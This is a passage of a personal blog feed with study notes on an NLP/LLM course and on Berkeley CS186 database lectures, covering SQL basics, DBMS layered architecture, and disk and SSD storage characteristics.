<p><a href="https://datawhaler.feishu.cn/wiki/PztLwkofsi95oak2Iercw9hkn2g">‌﻿⁠‍⁠‬⁠﻿‌‍‬‌﻿‬⁠‌‍⁠‍⁠‍‬﻿﻿‌Task2：从baseline代码详解入门深度学习 - 飞书云文档 (feishu.cn)</a></p>
<h3 id="Task-3：基于-Transformer-模型实现在机器翻译任务上的应用"><a class="header-anchor" href="#Task-3：基于-Transformer-模型实现在机器翻译任务上的应用">¶</a>Task 3：基于 Transformer 模型实现在机器翻译任务上的应用</h3>
<p><a href="https://datawhaler.feishu.cn/wiki/OgQWwkYkviPfpwkE1ZmcXwcWnAh">‌﻿‬‌‍‬‬‬⁠‬⁠‍‬⁠﻿﻿‍‬‌‬‌﻿‍‬⁠﻿﻿‬Task3知识点文档 - 飞书云文档 (feishu.cn)</a></p>
<p>看完一遍有点懵……ok其实是很懵。。。</p>
<p><a href="https://blog.csdn.net/m0_51879931/article/details/134142492">transformer模型— 20道面试题自我检测_transformer面试题-CSDN博客</a></p>
<h3 id="Task-4：通过代码实践入门大模型处理机器翻译"><a class="header-anchor" href="#Task-4：通过代码实践入门大模型处理机器翻译">¶</a>Task 4：通过代码实践入门大模型处理机器翻译</h3>
<ul>
<li>选修性质</li>
</ul>
<p><a href="https://datawhaler.feishu.cn/wiki/L64jw94HwivDoQkptGccDMCznxc">⁠‍⁠‌‌﻿‌‍﻿‍‌‬⁠‍‌‬﻿⁠⁠‌‬‬⁠⁠⁠Task4知识点文档 - 飞书云文档 (feishu.cn)</a></p>
<p><a href="https://datawhalechina.github.io/llm-universe/#/">动手学大模型应用开发 (datawhalechina.github.io)</a></p>
<p><a href="https://github.com/datawhalechina/self-llm/tree/master">datawhalechina/self-llm: 《开源大模型食用指南》基于Linux环境快速部署开源大模型，更适合中国宝宝的部署教程 (github.com)</a></p>
]]></content>
      <categories>
        <category>notes</category>
        <category>NLP notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>NLP</tag>
      </tags>
  </entry>
  <entry>
    <title>CS186 SQL1 Berkeley</title>
    <url>/project/2024/07/04/CS_Notes/Database/CS186%20SQL1/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>Berkeley CS186 Intro to DB Systems</p>
<p><a href="https://www.youtube.com/watch?v=Q-dxGaR3fH0&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=6">视频地址</a>  课程记录</p>
<h2 id="SQL-1"><a class="header-anchor" href="#SQL-1">¶</a>SQL 1</h2>
<h3 id="what-is-database"><a class="header-anchor" href="#what-is-database">¶</a>what is database</h3>
<h4 id="一些术语"><a class="header-anchor" href="#一些术语">¶</a>一些术语</h4>
<p><code>Relation/Table</code></p>
<ul>
<li><code>Schema: description(&quot;metadata&quot;)</code></li>
<li><code>Instance: set of data satisfying the schema</code></li>
</ul>
<p><code>Attribute/Column/Field</code></p>
<p><code>Tuple/Record/Row</code></p>
<h4 id="一些注意事项"><a class="header-anchor" href="#一些注意事项">¶</a>一些注意事项</h4>
<ol>
<li>每列的类型都是<code>原子类型(无法再细分的)</code>,因此不会是<code>list</code>或者<code>map</code>那种类型的数据</li>
<li><code>saddress</code> 每一行都要<code>fit the schema</code>  简单说就是三行三列的表中不能插入四列的数据行</li>
<li><code>baddress</code>  每一列的名字不能相同</li>
<li><code>maddress</code>  数据类型只能是原子类型</li>
</ol>
<h3 id="SQL-Language"><a class="header-anchor" href="#SQL-Language">¶</a>SQL Language</h3>
<h4 id="Two-sublanguages"><a class="header-anchor" href="#Two-sublanguages">¶</a>Two sublanguages</h4>
<p><code>DDL</code>-Data Definition Language-Define and modify schema   用于定义和修改数据库架构</p>
<p><code>DML</code>-Data Manipulation Language-Queries can be written intuitively  用于操作实际数据</p>
<h4 id="The-SQL-DDL-Sailors"><a class="header-anchor" href="#The-SQL-DDL-Sailors">¶</a>The SQL DDL: Sailors</h4>
<p>以Sailors为例子，来创建数据表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Sailors (</span><br><span class="line">	sid <span class="type">INTEGER</span>,</span><br><span class="line">	sname <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">	rating <span class="type">INTEGER</span>,</span><br><span class="line">	age <span class="type">FLOAT</span>,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (sid)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>sid</th>
<th>SNAME</th>
<th>RATING</th>
<th>AGE</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Fred</td>
<td>7</td>
<td>22</td>
</tr>
<tr>
<td>2</td>
<td>Jim</td>
<td>2</td>
<td>39</td>
</tr>
<tr>
<td>3</td>
<td>Nancy</td>
<td>8</td>
<td>27</td>
</tr>
</tbody>
</table>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Boats (</span><br><span class="line">	bid <span class="type">INTEGER</span>,</span><br><span class="line">	bname <span class="type">CHAR</span>(<span class="number">20</span>),</span><br><span class="line">	color <span class="type">CHAR</span>(<span class="number">10</span>),</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (Bid)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>BID</th>
<th>BNAME</th>
<th>COLOR</th>
</tr>
</thead>
<tbody>
<tr>
<td>101</td>
<td>Nina</td>
<td>red</td>
</tr>
<tr>
<td>102</td>
<td>Pinta</td>
<td>blue</td>
</tr>
<tr>
<td>103</td>
<td>Santa Maria</td>
<td>red</td>
</tr>
</tbody>
</table>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Reserves (</span><br><span class="line">	sid <span class="type">INTEGER</span>,</span><br><span class="line">	bid <span class="type">INTEGER</span>,</span><br><span class="line">	<span class="keyword">day</span> <span class="type">DATE</span>,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (sid, bid, <span class="keyword">day</span>),</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (sid)  <span class="keyword">REFERENCES</span> Sailors;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>sid</th>
<th>bid</th>
<th>day</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>102</td>
<td>9/12</td>
</tr>
<tr>
<td>2</td>
<td>102</td>
<td>9/13</td>
</tr>
</tbody>
</table>
<h5 id="Primary-Key-column-s"><a class="header-anchor" href="#Primary-Key-column-s">¶</a>Primary Key column(s)</h5>
<ul>
<li>provide a unique “lookup key” for the relation   提供关系的唯一查找键    sid对于这些键值是唯一的</li>
<li>cannot have any duplicate values  不能有重复的值，主键的值在表中必须是唯一的</li>
<li>can be made up of &gt; 1 column  主键可以由多列组成   由多列组成的话就叫做复合主键（kimi给的例子：如果一个表中存储了多个部门的员工信息，可能需要使用部门ID和员工ID的组合作为主键来确保唯一性 ）</li>
</ul>
<h5 id="Foreign-Key-column-s"><a class="header-anchor" href="#Foreign-Key-column-s">¶</a>Foreign Key column(s)</h5>
<p>Foreign Key column(s)  外键</p>
<p>外键应用另一个表的主键或唯一键</p>
<p>上述外键是<code>Sailors</code>表的指针，即<code>Reserves</code>的<code>sid</code>指向<code>Sailors</code>的<code>sid</code></p>
<ul>
<li>Foreign Key references a table via the primary key of that table  外键通过另一个表的主键来引用另一个表</li>
<li>need not share the name of the referenced primary key    不一定和被引用的主键同名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> Reserves (</span><br><span class="line">	sid <span class="type">INTEGER</span>,</span><br><span class="line">	bid <span class="type">INTEGER</span>,</span><br><span class="line">	<span class="keyword">day</span> <span class="type">DATE</span>,</span><br><span class="line">    <span class="keyword">PRIMARY</span> KEY (sid, bid, <span class="keyword">day</span>),</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (sid)  <span class="keyword">REFERENCES</span> Sailors,</span><br><span class="line">    <span class="keyword">FOREIGN</span> KEY (bid)  <span class="keyword">REFERENCES</span> Boats;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h4 id="The-SQL-DML"><a class="header-anchor" href="#The-SQL-DML">¶</a>The SQL DML</h4>
<h5 id="Basic-Single-Table-Queries"><a class="header-anchor" href="#Basic-Single-Table-Queries">¶</a>Basic Single-Table Queries</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">DISTINCT</span>] <span class="operator">&lt;</span><span class="keyword">column</span> expression list<span class="operator">&gt;</span> <span class="keyword">FROM</span> <span class="operator">&lt;</span>single <span class="keyword">table</span><span class="operator">&gt;</span> [<span class="keyword">WHERE</span> <span class="operator">&lt;</span>predicate<span class="operator">&gt;</span>]</span><br></pre></td></tr></table></figure>
<h5 id="SELECT-DISTINCT"><a class="header-anchor" href="#SELECT-DISTINCT">¶</a>SELECT DISTINCT</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> S.name, S.gpa</span><br><span class="line"><span class="keyword">FROM</span> students (<span class="keyword">AS</span>) S</span><br><span class="line"><span class="keyword">WHERE</span> S.dept <span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>DISTINCT specifies removal of duplicate rows before output  DISTINCT 在输出前会移除重复行，如果查询结果有多行相同数据，DISTINCT 会保证这些重复行只被显示一次</li>
<li>Can refer to the students table as “S”, this is called an alias   把学生列表记作S，S是其别名，可以简化查询，提高可读性  定义别名的AS可省略</li>
</ul>
<h5 id="ORDER-BY"><a class="header-anchor" href="#ORDER-BY">¶</a>ORDER BY</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.name, S.gpa, S.age <span class="operator">*</span> <span class="number">2</span> <span class="keyword">AS</span> A2</span><br><span class="line"><span class="keyword">FROM</span> Students S</span><br><span class="line"><span class="keyword">WHERE</span> S.dept <span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> S.gpa, S.name, A2</span><br></pre></td></tr></table></figure>
<ul>
<li>将两倍年龄别名为A2</li>
<li>ORDER BY clause specifies output to be sorted-Lexicographic ordering   按照字典序排序输出</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.name, S.gpa, S.age <span class="operator">*</span> <span class="number">2</span> <span class="keyword">AS</span> A2</span><br><span class="line"><span class="keyword">FROM</span> Students S</span><br><span class="line"><span class="keyword">WHERE</span> S.dept <span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> S.gpa <span class="keyword">DESC</span>, S.name <span class="keyword">ASC</span>, A2</span><br></pre></td></tr></table></figure>
<ul>
<li>DESC  降序  ASC  升序  默认是升序</li>
</ul>
<h5 id="LIMIT"><a class="header-anchor" href="#LIMIT">¶</a>LIMIT</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.name, S.gpa, S.age <span class="operator">*</span> <span class="number">2</span> <span class="keyword">AS</span> A2</span><br><span class="line"><span class="keyword">FROM</span> Students S</span><br><span class="line"><span class="keyword">WHERE</span> S.dept <span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> S.gpa <span class="keyword">DESC</span>, S.name <span class="keyword">ASC</span>, a2;</span><br><span class="line">LIMIT <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>限制输出为几行</li>
</ul>
<h5 id="Aggregates"><a class="header-anchor" href="#Aggregates">¶</a>Aggregates</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">DISTINCT</span>] <span class="built_in">AVG</span>(S.gpa)</span><br><span class="line"><span class="keyword">FROM</span> students S</span><br><span class="line"><span class="keyword">WHERE</span> S.dept <span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>AVG()：计算平均值</p>
</li>
<li>
<p>Before producing output, compute a summary(a.k.a. an aggregate) of some arithmetic expression</p>
</li>
<li>
<p>produce 1 row of output -with one column in this case</p>
</li>
<li>
<p>other aggregates: SUM, COUNT, MAX, MIN</p>
</li>
</ul>
<h5 id="GROUP-BY"><a class="header-anchor" href="#GROUP-BY">¶</a>GROUP BY</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">DISTINCT</span>] <span class="built_in">AVG</span>(S.gpa), S.dept</span><br><span class="line"><span class="keyword">FROM</span> students S</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> S.dept</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>GROUP BY：按照GROUP BY后面列出的列，进行分组</p>
</li>
<li>
<p>Partition table into groups with same GROUP BY column values - Can group by a list of columns    将表按照具有相同GROUP BY列值的组进行分区，可以根据一列或多列进行分组</p>
</li>
<li>
<p>Produce an aggregate result per group -Cardinality of output = # of distinct group values   为每个组生成一个聚合结果，输出的基数等于不同组值的数量</p>
</li>
<li>
<p>Note: can put grouping columns in SELECT list   可以将分组放入SELECT列表</p>
</li>
</ul>
<h5 id="HAVING"><a class="header-anchor" href="#HAVING">¶</a>HAVING</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">DISTINCT</span>] <span class="built_in">AVG</span>(S.gpa), S.dept</span><br><span class="line"><span class="keyword">FROM</span> students S</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> S.dept</span><br><span class="line"><span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">&gt;</span> <span class="number">2</span></span><br></pre></td></tr></table></figure>
<ul>
<li>The HAVING predicate filters groups  用于过滤分组后的结果</li>
<li>HAVING is applied after grouping and aggregation    HAVING子句在分组和聚合计算完成后应用       -Hence can contain anything that could go in the SELECT list  因此可以包含选择列表中的任何内容</li>
<li>HAVING can only be used in aggregate queries   HAVING只能用在聚合查询中</li>
<li>it’s an optional clause    可选非必须</li>
</ul>
<h5 id="Putting-it-all-together"><a class="header-anchor" href="#Putting-it-all-together">¶</a>Putting it all together</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.dept, <span class="built_in">AVG</span>(S.gpa), <span class="built_in">COUNT</span>(<span class="operator">*</span>)</span><br><span class="line"><span class="keyword">FROM</span> students S</span><br><span class="line"><span class="keyword">WHERE</span> S.gender <span class="operator">=</span> <span class="string">&#x27;F&#x27;</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> S.dept</span><br><span class="line"><span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">&gt;=</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> S.dept</span><br></pre></td></tr></table></figure>
<h5 id="DISTINCT-Aggregates"><a class="header-anchor" href="#DISTINCT-Aggregates">¶</a>DISTINCT Aggregates</h5>
<p>DISTINCT can be used inside or outside of aggregate function, but have different meanings</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span> S.name)</span><br><span class="line"><span class="keyword">FROM</span> Students S</span><br><span class="line"><span class="keyword">WHERE</span> S.dept <span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> <span class="built_in">COUNT</span>(S.name)</span><br><span class="line"><span class="keyword">FROM</span> Students S</span><br><span class="line"><span class="keyword">WHERE</span> S.dept <span class="operator">=</span> <span class="string">&#x27;CS&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>第一个：在计数之前先把所有重复项移除   相当于只计算有多少中不同项</li>
<li>第二个：先计数，再移除重复项   相当于计算所有项</li>
</ul>
<h5 id="What-Is-This-Asking-For"><a class="header-anchor" href="#What-Is-This-Asking-For">¶</a>What Is This Asking For?</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.name, <span class="built_in">AVG</span>(S.gpa)</span><br><span class="line"><span class="keyword">FROM</span> Students S</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> S.dept</span><br></pre></td></tr></table></figure>
<ul>
<li><code>illegal query</code>   因为<code>S.name</code>没有被包含在<code>GROUP BY</code> 子句中，也没有被用在聚合函数中。数据库不知道应该选择哪个学生的姓名来显示，因为可能有多个学生具有相同的系别（<code>S.dept</code>）。</li>
</ul>
<h5 id="SQL-DML-General-Basic-Single-Table-Queries"><a class="header-anchor" href="#SQL-DML-General-Basic-Single-Table-Queries">¶</a>SQL DML: General Basic Single-Table Queries</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">DISTINCT</span>] <span class="operator">&lt;</span><span class="keyword">column</span> expression list<span class="operator">&gt;</span> <span class="keyword">FROM</span> <span class="operator">&lt;</span>single <span class="keyword">table</span><span class="operator">&gt;</span></span><br><span class="line">[<span class="keyword">WHERE</span> <span class="operator">&lt;</span>predictable<span class="operator">&gt;</span>]</span><br><span class="line">[<span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="operator">&lt;</span><span class="keyword">column</span> list<span class="operator">&gt;</span>]</span><br><span class="line">[<span class="keyword">HAVING</span> <span class="operator">&lt;</span>predicate<span class="operator">&gt;</span>]</span><br><span class="line">[<span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="operator">&lt;</span><span class="keyword">column</span> list<span class="operator">&gt;</span>]</span><br><span class="line">[LIMIT <span class="operator">&lt;</span><span class="type">integer</span><span class="operator">&gt;</span>]</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>notes</category>
        <category>SQL notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>CS186 SQL3 Berkeley</title>
    <url>/project/2024/07/08/CS_Notes/Database/CS186-SQL3/</url>
    <content><![CDATA[<h3 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h3>
<p>Berkeley CS186 Intro to DB Systems</p>
<p><a href="https://www.youtube.com/watch?v=Q-dxGaR3fH0&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=6">视频地址</a>  课程记录</p>
<h1>SQL 3</h1>
<h2 id="Architecture-of-a-DBMS-SQL-Client"><a class="header-anchor" href="#Architecture-of-a-DBMS-SQL-Client">¶</a>Architecture of a DBMS: SQL Client</h2>
<ul>
<li>数据库管理系统的架构：SQL客户端</li>
<li>Database Management System</li>
</ul>
<h3 id="DBMS-Parsing-Optimization"><a class="header-anchor" href="#DBMS-Parsing-Optimization">¶</a>DBMS: Parsing &amp; Optimization</h3>
<ul>
<li>数据库管理系统（DBMS）：解析与优化</li>
</ul>
<h4 id="Purpose"><a class="header-anchor" href="#Purpose">¶</a>Purpose:</h4>
<ul>
<li>
<p>Parse, check, and verify the SQL, and translate into an efficient relational query plan</p>
</li>
<li>
<p>解析、检查和验证SQL语句，将其转换为高效的关系查询方案</p>
</li>
<li>
<pre><code class="language-sql">SELECT S.sid, S.sname, R.bid
FROM Sailors S, Reserves R
WHERE S.sid = R.sid and S.age &gt; 30
GROUP BY age
</code></pre>
</li>
</ul>
<h3 id="DBMS-Relational-Operators"><a class="header-anchor" href="#DBMS-Relational-Operators">¶</a>DBMS: Relational Operators</h3>
<ul>
<li>数据库管理系统（DBMS）：关系操作符</li>
</ul>
<h4 id="Purpose-v2"><a class="header-anchor" href="#Purpose-v2">¶</a>Purpose:</h4>
<ul>
<li>Execute a dataflow by operating on records and files</li>
<li>通过在记录和文件上执行数据流来操作数据</li>
</ul>
<h3 id="DBMS-Files-and-Index-Management"><a class="header-anchor" href="#DBMS-Files-and-Index-Management">¶</a>DBMS: Files and Index Management</h3>
<ul>
<li>文件和索引管理</li>
</ul>
<h4 id="Purpose-v3"><a class="header-anchor" href="#Purpose-v3">¶</a>Purpose:</h4>
<ul>
<li>Organize tables and Records as groups of pages in a logical file</li>
<li>将表和记录组织成逻辑文件中的页面组</li>
</ul>
<h3 id="DBMS-Buffer-Management"><a class="header-anchor" href="#DBMS-Buffer-Management">¶</a>DBMS: Buffer Management</h3>
<ul>
<li>缓冲区管理层</li>
</ul>
<h4 id="Purpose-v4"><a class="header-anchor" href="#Purpose-v4">¶</a>Purpose:</h4>
<ul>
<li>Provide the illusion of operating in memory</li>
<li>提供一种操作内存的假象</li>
</ul>
<h3 id="DBMS-Disk-Space-Management"><a class="header-anchor" href="#DBMS-Disk-Space-Management">¶</a>DBMS: Disk Space Management</h3>
<ul>
<li>磁盘空间管理</li>
</ul>
<h4 id="Purpose-v5"><a class="header-anchor" href="#Purpose-v5">¶</a>Purpose:</h4>
<ul>
<li>
<p>Translate page requests into physical bytes on one or more device(s)</p>
</li>
<li>
<p>将缓冲区管理器的页面请求转换为一个或多个设备（如磁盘、固态磁盘）上的物理字节</p>
</li>
</ul>
<h3 id="Architecture-of-a-DBMS"><a class="header-anchor" href="#Architecture-of-a-DBMS">¶</a>Architecture of a DBMS</h3>
<ul>
<li>数据库管理系统的架构
<ul>
<li>Organized in layers   层次架构</li>
<li>Each layer abstracts the layer below  每一层都抽象了其下的层次
<ul>
<li>Manage complexity    管理复杂性</li>
<li>Performance assumptions   性能假设</li>
</ul>
</li>
<li>Example of good systems design   DBMS是良好的系统设计示例</li>
</ul>
</li>
</ul>
<table>
<thead>
<tr>
<th>SQL CLIENT</th>
</tr>
</thead>
<tbody>
<tr>
<td>Query Parsing &amp; Optimization       <strong>解析与优化</strong></td>
</tr>
<tr>
<td>Relational Operators                         <strong>关系操作符</strong></td>
</tr>
<tr>
<td>Files and Index Management           <strong>文件和索引管理</strong></td>
</tr>
<tr>
<td>Buffer Management                            <strong>缓冲区管理</strong></td>
</tr>
<tr>
<td>Disk Space Management                     <strong>磁盘空间管理</strong></td>
</tr>
<tr>
<td>DBMS的架构通常分为几个层次，每一层都为上层提供服务，同时抽象了下层的复杂性。这种分层的设计有助于提高系统的可维护性和可扩展性</td>
</tr>
<tr>
<td>DATABASE</td>
</tr>
</tbody>
</table>
<h3 id="DBMS-Concurrency-Recovery"><a class="header-anchor" href="#DBMS-Concurrency-Recovery">¶</a>DBMS: Concurrency &amp; Recovery</h3>
<ul>
<li>
<p>并发控制与恢复（？</p>
</li>
<li>
<p>Two cross-cutting issues related to storage and memory management</p>
</li>
</ul>
<h2 id="Before-we-begin-storage-media"><a class="header-anchor" href="#Before-we-begin-storage-media">¶</a>Before we begin: storage media</h2>
<h3 id="Disks"><a class="header-anchor" href="#Disks">¶</a>Disks</h3>
<ul>
<li>Most database systems were originally designed for magnetic disks   大多数数据库系统最初是为磁盘设计的
<ul>
<li>Disk are a mechanical anachronism    磁盘是一种机械性的过时技术</li>
<li>Instilled design ideas that apply to using solid state disks as well    它所灌输的设计思想也适用于固态硬盘的使用</li>
</ul>
</li>
<li>Major implications   主要影响
<ul>
<li><strong>No “pointer derefs”</strong> .Instead, an API:   没有“指针解”引用
<ul>
<li>READ: transfer “page” of data from disk to RAM    （读取）将数据的“页面”从磁盘传输到RAM</li>
<li>WRITE: transfer “page” of data from RAM to disk      （写入）将数据的“页面”从RAM传输到磁盘</li>
</ul>
</li>
<li>Both API calls are very, very slow     这两个API调用都非常非常慢
<ul>
<li>Plan carefully   仔细规划</li>
</ul>
</li>
<li>An explicit API can be a good thing   明确的API
<ul>
<li>Minimizes the kind of pointer errors you see in C    最小化了你在C语言中看到的指针错误类型</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Storage-Hierarchy"><a class="header-anchor" href="#Storage-Hierarchy">¶</a>Storage Hierarchy</h3>
<ul>
<li>存储层次结构</li>
<li>存储层次结构是计算机系统中不同类型存储设备的层级排列，从最快的到最慢的【从上到下】</li>
</ul>
<table>
<thead>
<tr>
<th>registers   寄存器</th>
</tr>
</thead>
<tbody>
<tr>
<td>L1   Cache       L1缓存</td>
</tr>
<tr>
<td>L2   Cache       L2缓存</td>
</tr>
<tr>
<td>RAM                随机存取存储器</td>
</tr>
<tr>
<td>SSD                  固态硬盘</td>
</tr>
<tr>
<td>Disk                  磁盘</td>
</tr>
</tbody>
</table>
<ul>
<li>emmm，理解下来就是读写到磁盘很慢（？</li>
</ul>
<h3 id="Components-of-a-Disk-Pt-6"><a class="header-anchor" href="#Components-of-a-Disk-Pt-6">¶</a>Components of a Disk, Pt. 6</h3>
<ul>
<li>
<p>Platters spin(say 15000 rpm)</p>
</li>
<li>
<p>Arm assembly moved in or out to position a head on a desired track</p>
<ul>
<li>Tracks under heads make a “cylinder”</li>
</ul>
</li>
<li>
<p>Only one head reads/writes at any one time</p>
</li>
<li>
<p>Block/page size is a multiple of (fixed) sector size</p>
</li>
<li>
<p>这个地方是磁盘结构的解释，所以待插入一张结构图，就一览了然了，当然目前我还不会插图片，后面来</p>
</li>
</ul>
<p><img src="https://notes.bencuan.me/cs186/Disks,%20Buffers,%20Files/Untitled%201.png" alt="Untitled|400"></p>
<h3 id="Accessing-a-Disk-page"><a class="header-anchor" href="#Accessing-a-Disk-page">¶</a>Accessing a Disk page</h3>
<ul>
<li>
<p>访问磁盘界面</p>
</li>
<li>
<p>Time to access (read/write)  a disk block:    读写磁盘块的时间   以下也涉及到磁盘结构那张图</p>
<ul>
<li>seek time (moving arms to position disk head on track)
<ul>
<li>~2-3 ms on average   寻道时间   磁盘头读取所需的磁道的位置</li>
</ul>
</li>
<li>rotational delay (waiting for block to rotate under head)
<ul>
<li>~0-4 ms (15000 RPM)   旋转延迟时间</li>
</ul>
</li>
<li>transfer time (actually moving data to/from disk surface)
<ul>
<li>~0.25 ms per 64KB page   将数据从磁盘表面移动到磁盘头/从磁盘头移动到磁盘表面得到时间</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Key to lower I/O cost: reduce seek/rotational delays    降低I/O成本的关键：减少寻道和旋转延迟的时间</p>
</li>
</ul>
<h3 id="Notes-on-Flash-SSD"><a class="header-anchor" href="#Notes-on-Flash-SSD">¶</a>Notes on Flash(SSD)</h3>
<ul>
<li>闪存/固态磁盘Solid State Disks，闪存通常组合在一起形成称为固态磁盘的磁盘驱动器</li>
<li>Issues in current generation (NAND)
<ul>
<li>Fine-grain reads (4-8K reads), coarse-grain writes (1-2 MB writes)    <strong>细粒度读取（Fine-grain reads）</strong>：可以进行4-8KB的细粒度读取;   <strong>粗粒度写入（Coarse-grain writes）</strong>：写入操作通常是1-2MB的粗粒度</li>
<li>Only 2k-3k erasures before failure, so keep moving hot write units around (“wear leveling”)     闪存的寿命限制：通常在2000到3000次擦除周期后可能发生故障，因此需要不断移动热点写入单元（“磨损均衡” wear leveling）</li>
<li>write amplification: big units, need to reorg for wear &amp; garbage collection    <strong>写入放大（Write amplification）</strong>：由于写入单元较大，需要重新组织数据以进行磨损均衡和垃圾收集</li>
</ul>
</li>
<li>So <strong>read</strong> is fast and predictable
<ul>
<li>Single read access time: 0.03 ms</li>
<li>4 KB random reads: ~500MB/sec</li>
<li>Sequential reads: ~525MB/sec</li>
<li>64K: 0.48 ms</li>
<li>在闪存中，顺序读取和随机读取的带宽速度大致一样</li>
</ul>
</li>
<li>But write is not . Slower for random
<ul>
<li>Single write access time: 0.03 ms   单次写入挺快的</li>
<li>4 KB random writes: ~120 MB/sec</li>
<li>Sequential writes: ~480 MB/sec</li>
<li>顺序写入相比随机写入速度快很多</li>
</ul>
</li>
<li>Flash is faster than disk. But disk offers about 10x the capacity per $就是disk在相等价钱下提供的容量更大（自分の理解）</li>
</ul>
<h2 id="Storage-Pragmatics-Trends"><a class="header-anchor" href="#Storage-Pragmatics-Trends">¶</a>Storage Pragmatics &amp; Trends</h2>
<ul>
<li>Many significant DBs are not big, but data sizes grow faster than Moore’s Law (“Big Data” is real) , so the role of disk, flash, RAM → to debate</li>
</ul>
<h3 id="Bottom-Line-last-few-years"><a class="header-anchor" href="#Bottom-Line-last-few-years">¶</a>Bottom Line (last few years)</h3>
<ul>
<li>Very large DBs: relatively traditional   非常大的数据库（Very large DBs）: 相对传统
<ul>
<li>Disk still the best cost/MB by a lot    磁盘仍然是成本/每兆字节（cost/MB）比最高的存储介质</li>
<li>SSDs improve performance and performance variance   固态硬盘（SSDs）提高了性能和性能的一致性</li>
</ul>
</li>
<li>Smaller DB story is changing quickly   小型数据库
<ul>
<li>Entry cost for disk is not cheap, so flash wins at the low end     磁盘的入门成本高，在低端市场闪存（flash）√</li>
<li>Many interesting databases fit in RAM     许多有趣的数据库可以完全装入RAM</li>
</ul>
</li>
</ul>
<h2 id="Disks-and-Files"><a class="header-anchor" href="#Disks-and-Files">¶</a>Disks and Files</h2>
<ul>
<li>Recall, most DBMSs stores information on <strong>Disks</strong> and <strong>SSDs</strong>   <u><strong>对以上Disk和SSD讨论的总结</strong></u>
<ul>
<li>Disk are a mechanical anachronism(slow)</li>
<li>SSDs faster, <strong>slow relative to memory</strong>, costly writes</li>
</ul>
</li>
</ul>
